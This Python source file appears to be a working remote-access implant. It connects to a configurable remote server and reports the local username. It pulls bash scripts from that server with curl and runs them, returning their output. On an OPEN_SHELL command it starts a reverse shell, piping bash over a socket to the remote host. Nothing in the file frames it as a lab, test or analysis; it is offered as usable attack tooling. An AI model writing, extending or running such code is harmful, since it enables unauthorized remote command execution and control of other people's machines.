import socket
from threading import Thread
from typing import Tuple
from queue import SimpleQueue
from base64 import b64decode, b64encode
import subprocess
import random
import string
import os
from time import sleep


class EnvKeys:
    REMOTE_IP = 'REMOTE_IP'
    REMOTE_PORT = 'REMOTE_PORT'
    RESOURCES_PORT = 'RESOURCES_PORT'
    SHELL_CONVERSATION_UID = 'SHELL_CONVERSATION_UID'


class Env:
    remote_ip = os.environ.get(EnvKeys.REMOTE_IP, 'localhost')
    remote_port = int(os.environ.get(EnvKeys.REMOTE_PORT, 1337))
    resources_port = int(os.environ.get(EnvKeys.RESOURCES_PORT, 1338))
    shell_conversation_uid = os.environ.get(EnvKeys.SHELL_CONVERSATION_UID, None)


class Message:
    PONG = 'PONG'
    REPLY = 'REPLY'
    RUN_SCRIPT = 'RUN_SCRIPT'
    OPEN_SHELL = 'OPEN_SHELL'
    conversation_uid: str
    purpose: str
    args: Tuple[str]

    def __init__(self, purpose: str, *args: str, conversation_uid=None):
        self.purpose = purpose
        self.args = args
        self.conversation_uid = conversation_uid if conversation_uid is not None else ''.join(random.choice(string.ascii_letters) for _ in range(16))

    def __str__(self):
        return f'{self.conversation_uid}:{self.purpose}:{[arg if len(arg) < 10 else f"{arg[10:]}..." for arg in self.args]}'

    @staticmethod
    def from_raw(line: bytes) -> 'Message':
        message_parts = tuple(b64decode(line_part).decode() for line_part in line.split(b':'))
        return Message(message_parts[1], *message_parts[2:], conversation_uid=message_parts[0])

    def to_raw(self):
        return b':'.join(b64encode(line_part.encode()) for line_part in [self.conversation_uid, self.purpose, *self.args])


class Communication:
    messages_received = SimpleQueue()  # type: SimpleQueue[Message]
    messages_to_send = SimpleQueue()  # type: SimpleQueue[Message]

    @staticmethod
    def initialise_communication(sock: socket.socket):
        Thread(target=Communication._receive_messages_forever, args=(sock,), daemon=True).start()
        Thread(target=Communication._send_messages_forever, args=(sock,), daemon=True).start()
        Thread(target=Communication._pong_forever, daemon=True).start()

    @staticmethod
    def _receive_messages_forever(sock: socket.socket):
        while True:
            Communication.messages_received.put(Message.from_raw(Core.receive_line_from_sock(sock)))

    @staticmethod
    def _send_messages_forever(sock: socket.socket):
        header_parts = [Config.username.encode()]
        sock.send(b':'.join([b64encode(header_part) for header_part in header_parts]) + b'\n')
        while True:
            sock.send(Communication.messages_to_send.get().to_raw() + b'\n')

    @staticmethod
    def _pong_forever():
        while 1:
            sleep(1)
            Communication.messages_to_send.put(Message(Message.PONG))


class Core:
    @staticmethod
    def receive_line_from_sock(sock: socket.socket):
        buffer = b''
        while True:
            chunk = sock.recv(1)
            if b'\n' == chunk:
                return buffer
            else:
                buffer += chunk


class MessageProcessor:
    @staticmethod
    def process_messages_forever():
        while True:
            message = Communication.messages_received.get()
            print(f'Processing: {message}')
            if message.purpose == Message.RUN_SCRIPT:
                script_name = message.args[0]
                script_data = MessageProcessor._get_resource('scripts', script_name)
                script = subprocess.Popen(['bash', '-s'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = script.communicate(script_data)
                Communication.messages_to_send.put(Message(
                    Message.REPLY,
                    stdout.decode(),
                    stderr.decode(),
                    conversation_uid=message.conversation_uid
                ))
            elif message.purpose == Message.OPEN_SHELL:
                subprocess.Popen(['python3', __file__], env={**os.environ, **{EnvKeys.SHELL_CONVERSATION_UID: message.conversation_uid}}, stdin=subprocess.DEVNULL)  # , stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                send_error_message('process_messages_forever', f'Unknown message purpose {message.purpose}')

    @staticmethod
    def _get_resource(category: str, name: str) -> bytes:
        print(f'{Env.remote_ip}:{Env.resources_port}/{category}/{name}')
        curl = subprocess.run(['curl', '-s', f'http://{Env.remote_ip}:{Env.resources_port}/{category}/{name}'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if curl.returncode != 0:
            send_error_message('process_messages_forever', f'Resources server down or missing {category}/{name}\n{curl.stderr.decode()}')
            raise Exception()
        return curl.stdout


def get_cmd_output(cmd: str, strip_new_line=True) -> str:
    proc = subprocess.run(cmd, shell=True, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    if strip_new_line and proc.stdout.decode()[-1] == '\n':
        return proc.stdout.decode()[:-1]
    else:
        return proc.stdout.decode()


class Config:
    username: str

    @staticmethod
    def initialise():
        Config.username = get_cmd_output('whoami')


def main():
    if Env.shell_conversation_uid is not None:
        os.environ.pop(EnvKeys.SHELL_CONVERSATION_UID)
        header = b':'.join(b64encode(header_part.encode()) for header_part in ['', Message.OPEN_SHELL, Env.shell_conversation_uid])
        sock = socket.create_connection((Env.remote_ip, Env.remote_port))
        sock.send(header + b'\n')
        stdin = sock.makefile('rb', 0)
        stdout = sock.makefile('wb', 0)
        exit(subprocess.run(['bash'], stdin=stdin, stdout=stdout, stderr=subprocess.DEVNULL).returncode)
    else:
        Config.initialise()
        sock = socket.create_connection((Env.remote_ip, Env.remote_port))
        Communication.initialise_communication(sock)
        MessageProcessor.process_messages_forever()


def send_error_message(location: str, error: str):
    Communication.messages_to_send.put(Message(
        'ERROR',
        location,
        error
    ))


if __name__ == '__main__':
    main()
